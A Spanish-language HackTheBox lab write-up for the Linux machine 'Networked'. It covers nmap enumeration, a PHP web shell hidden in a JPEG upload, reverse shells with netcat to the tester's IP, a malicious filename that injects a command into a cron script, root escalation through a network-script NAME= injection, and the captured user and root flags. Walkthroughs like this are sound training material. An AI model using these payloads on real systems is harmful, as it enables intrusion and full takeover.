---
date: 2024-04-16 22:54:50
layout: post
title: "HTB WriteUp - Networked"
subtitle: Guia para resolver esta maquina Linux - Easy de HackTheBox
description: Maquina Linux Easy de HTB
image: /assets/img/uploads/networked.png
optimized_image:
category: pen-testing
tags: HTB Easy
author: ojoconelbyte
paginate: false
---

#  Networked 

### Info y vistazo general de la máquina!
- Categorias -> Evaluación de Vulnerabilidades, Aplicaciones Web
- Areas de interes -> Analisis del codigo fuente e inyecciones. 
- Vulnerabilidades -> Command Injection en Sistema Operativo y File Upload Bypass 
- Lenguajes -> PHP 

# Resumen de Resolución de máquina 
- Networked es una maquina Linux  Easy vulnerable a file upload bypass, que nos permite ejecución de código. Debido a una mala sanitización, una crontab corriendo como el usuario puede explotarse para conseguir ejecución de comandos. El usuario tiene privilegios para correr un network configuration script, lo que puede abusarse para lograr una ejecución de comandos como administrador de la máquina y lograr control total de la misma. 
## Habilidades Mejoradas
- Analisis de sanitización en WebApps, FileUploadBypass en PHP. 
- Explotación de crontabs y network configuration script. 

## Herramientas utilizadas
- [[nmap]]

---

# Information Gathering

Empezando con un escaneo de todos los puertos TCP, con un stealthScan para emitir paquetes RST y no concretar un threeWayHandshake (lo hace más sigiloso al escaneo), sin resolución dns y host discovery, exportandolo en formato grepeable en el archivo Ports:
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.146 -oG Ports

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 19:43 WEST
Initiating SYN Stealth Scan at 19:43
Scanning 10.10.10.146 [65535 ports]
Discovered open port 22/tcp on 10.10.10.146
Discovered open port 80/tcp on 10.10.10.146
Completed SYN Stealth Scan at 19:44, 26.49s elapsed (65535 total ports)
Nmap scan report for 10.10.10.146
Host is up, received user-set (0.23s latency).
Scanned at 2024-04-16 19:43:50 WEST for 26s
Not shown: 65500 filtered tcp ports (no-response), 32 filtered tcp ports (host-prohibited), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.56 seconds
           Raw packets sent: 131043 (5.766MB) | Rcvd: 35 (2.432KB)
```

Enumerando los puertos TCP abiertos, en este caso el 22 y 80, generalmente usados para el servicio de SSH y un servidor web HTTP respectivamente, y lo exportamos al escaneo de enumeración en formato normal al archivo Target:
```bash
nmap -sCV -p22,80 10.10.10.146 -oN Target

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 19:45 WEST
Nmap scan report for 10.10.10.146
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.80 seconds
```

Enumerando directorios comunes usados por aplicaciones web y servers con el script http-enum de nmap donde exportamos el resultado en formato normal y lo llamamos httpScan, logramos encontrar tres rutas relevantes /backup/ /icons/ y /uploads/:
```bash
nmap --script http-enum -p80 10.10.10.146 -oN httpScan 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 20:31 WEST
Nmap scan report for 10.10.10.146
Host is up (0.22s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /backup/: Backup folder w/ directory listing
|   /icons/: Potentially interesting folder w/ directory listing
|_  /uploads/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 25.50 seconds
```


---

# Enumeration
## Port 80 - HTTP (Apache 2.4.6)
Luego de correr el scrip http-enum podemos lograr encontrar unos directorios relevantes para nosotros, si empezamos con el backup, podemos dirigirnos a 10.10.10.146/backup/ en el navegador y tendremos que descargar un archivo backup.tar, lo movemos a una carpeta nuestra y podemos con el comando 
``` bash
└─$ 7z l backup.tar                    

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 10240 bytes (10 KiB)

Listing archive: backup.tar

--
Path = backup.tar
Type = tar
Physical Size = 10240
Headers Size = 4096
Code Page = UTF-8
Characteristics = GNU ASCII

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2019-07-09 12:33:38 .....          229          512  index.php
2019-07-02 12:38:56 .....         2001         2048  lib.php
2019-07-02 13:53:53 .....         1871         2048  photos.php
2019-07-02 13:45:10 .....         1331         1536  upload.php
------------------- ----- ------------ ------------  ------------------------
2019-07-09 12:33:38               5432         6144  4 files
```

Si nos dirigimos a 10.10.10.146/upload.php podemos subir una imagen jpeg de prueba para ver si nos permite la File Upload Bypass.

---

# Exploitation
## File Upload Bypass

Al dejarnos sin ningun problema, podemos resubir la misma imagen, pero modificando el .jpeg de dos maneras:
1. primero cambiamos la extension a image.php.jpeg, para darle la posibilidad a la imagen de correr codigo php una vez se suba al servidor apache. 
```
└─$ mv image.jpeg image.php.jpeg
```
2. Agregando codigo para que PHP nos interprete comandos del sistema y asi poder lograr ejecutar codigo que pueda leakear información.
```bash
# agregar en cualquier linea del archivo raw de la image.php.jpeg
<?php system($_GET['cmd']); ?>
```

3. Si vamos hacia view-source:http://10.10.10.146/uploads/10_10_14_42.php.jpeg?cmd=cat%20/etc/passwd en el navegador podemos ver que se pueden listar comandos de sistema. 
```bash
��t^+P�l�3\�Tx~U9�抏�`���p��~O�t��TF,�K��
Ԗ�Զ�
# cat /etc/passwd output is leaked! 
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
guly:x:1000:1000:guly:/home/guly:/bin/bash
saslauth:x:998:76:Saslauthd user:/run/saslauthd:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
�A}�� n�p��T�ٜV�쫞\�C�N.7+>
```

Creando una Reverse Shell para obtener una terminal bash en la maquina víctima, modificando el comando lanzado en el file upload bypass. 

```bash
# en el navegador poner: 
view-source:http://10.10.10.146/uploads/10_10_14_42.php.jpeg?cmd=nc -e /bin/bash 10.10.14.42 443
# obtenemos la bash y hay que hacer un tratamiento del tty para usarla normalmente
script /dev/null -c bash
# apretamos CTRL + Z 
stty raw -echo; fg
# le ponemos a Terminal type?
xterm
# luego
export TERM=xterm
export SHELL=bash
# en una pestaña de su terminal pongan el comando
stty size 
# copien el numero de rows y columns y seten en la bash esos numeros
stty rows 48 columns 142
# YA A PARTIR DE AQUI tenemos una bash operacional desde el user apache
└─$ whoami
apache
```

---

# Lateral Movement to user
## Local Enumeration

Viendo que tenemos la shell, si observamos tambien hay un acceso a poder ver que contenidos ejecuta el user Guly.
```bash
cd home/guly/
ls
check_attack.php crontab.guly user.txt
```
podemos ver que hay un crontab que ejecuta un codigo php, donde se lee de una ruta en particular /var/www/html/uploads/ donde se suben las imagenes, y luego de ahi realiza un chequeo de todas las imagenes subidas, para borrarlas del directorio.
## Lateral Movement vector
Ahora viendo que hay este archivo php, y que lee lo que este en el dir /var/www/html/uploads/ si creamos un archivo llamado "; nc -c bash 10.10.14.42 443" para spawnear una shell del user Guly, esperamos tres minutos ya que el crontab.guly se ejecuta iterativamente cada tres minutos, podemos aprovecharnos de esto para que luego se aplique por defecto en el crontab al leer el directorio /html/uploads/ y encontrar un archivo para manipular, debido a que se ejecuta por el user guly, va a interpretar el nombre "; nc -c bash 10.10.14.42 443" y se nos debería abrir una shell nueva. 
```bash
# para eso, creamos el archivo "; nc -c bash 10.10.14.42 443"
cd  /var/www/html/uploads/
touch '; nc -c bash 10.10.14.42 443'
# nos ponemos en la escucha por el puerto 443
nc -nlvp 443
listening on port :::443
whoami
guly
```
Tendríamos que volver a tratar el tty de la shell, para dejarla funcional para CTRL+C, y otras funcionalidades. 
```bash
script /dev/null -c bash
# apretamos CTRL + Z 
stty raw -echo; fg
# le ponemos a Terminal type?
xterm
# luego
export TERM=xterm
export SHELL=bash
# en una pestaña de su terminal pongan el comando
stty size 
# copien el numero de rows y columns y seten en la bash esos numeros
stty rows 48 columns 142
```
Una vez hecho esto buscamos y encontramos la flag del usuario Gupy
```bash
cd /gupy/
cat user.txt
01cbd629d379730a4e597d424dba1568
```
---

# Privilege Escalation
## Local Enumeration
Una vez usuario, si nos ejecutamos un listado de nuestros permisos de sudo veremos que tenemos permiso de root para ejecutar /usr/local/sbin/changename.sh
``` bash
sudo -l
(root) NOPASSWD:  /usr/local/sbin/changename.sh
```
Si vemos lo que hace el script, vemos que en particular ejecuta codigo de una ruta que sería etc/sysconfig/network-scripts
## Privilege Escalation Vector
Si lo googleamos y ponemos etc/sysconfig/network-scripts exploit, podemos encontrar una vulnerabilidad de RedHat/CentOS donde el network-scripts no utiliza bien el parametro NAME= que le podemos brindar nosotros al correr el script changename.sh
Si le ponemos NAME=asdf bash 
nos ejecuta el comando bash en root por lo tanto nos debería devolver una consola con privilegios de administrador, por ultimo nos dirigimos a /root/ y tenemos la flag!
```bash
sudo /usr/local/sbin/changename.sh
interface NAME:
asdf bash
# aqui se crea la bash
whoami
root
cd /root/
cat root.txt
df701510e158c83aeeb910f877df1f59
```

---

# Flags
user.txt 01cbd629d379730a4e597d424dba1568
root.txt df701510e158c83aeeb910f877df1f59
# Cerrando
Esta box estuvo muy buena y la verdad que nos muestra lo fácil que puede ser entrar si no se sanitizan inputs, ya sea el file upload bypass, ya sea hacer un chequeo de que no se leen comas por bash, y por ultimo saber que version y que Sistema Operativo elegir si vamos a tener algo hosteado en el. 
La dificultad va a ser variable con la experiencia previa del que la intente resolver a esta máquina, pero esta sería una dificultad Fácil, las Medias y Dificiles se nota mucho el salto en complejidad, aunque sea a mi parecer. 

Aqui les dejo mi trofeo/achievement!
https://www.hackthebox.com/achievement/machine/1449292/203